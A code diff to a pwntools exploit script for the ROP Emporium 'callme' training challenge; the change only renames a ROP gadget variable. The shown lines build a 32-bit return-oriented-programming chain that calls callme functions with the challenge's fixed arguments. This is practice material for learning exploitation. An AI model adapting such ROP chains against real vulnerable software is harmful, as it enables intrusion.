@@ -29,8 +29,8 @@ def exploit(binary_path):
         rop = ROP(elf)
 
         # Use ROPgadget to find the address of a "pop esi ; pop edi ; pop ebp ; ret" instruction
-        gadget = ROP(elf).find_gadget(['pop esi', 'pop edi','pop ebp','ret']).address
-        log.debug(f"The address of ROP gadget pop esi ; pop edi ; pop ebp ; ret is {hex(gadget)}")
+        pop_gadget = ROP(elf).find_gadget(['pop esi', 'pop edi','pop ebp','ret']).address
+        log.debug(f"The address of ROP gadget pop esi ; pop edi ; pop ebp ; ret is {hex(pop_gadget)}")
 
         # Get the address of the callme_one function in the procedure linkage table
         callme_one_addr = elf.plt['callme_one']
@@ -57,7 +57,7 @@ def exploit(binary_path):
         # Loop through the callme() addresses and add the arguments for each function call
         for addr in function_addr:
             payload += p32(addr)
-            payload += p32(gadget)
+            payload += p32(pop_gadget)
             payload += p32(0xdeadbeef)
             payload += p32(0xcafebabe)
             payload += p32(0xd00df00d)
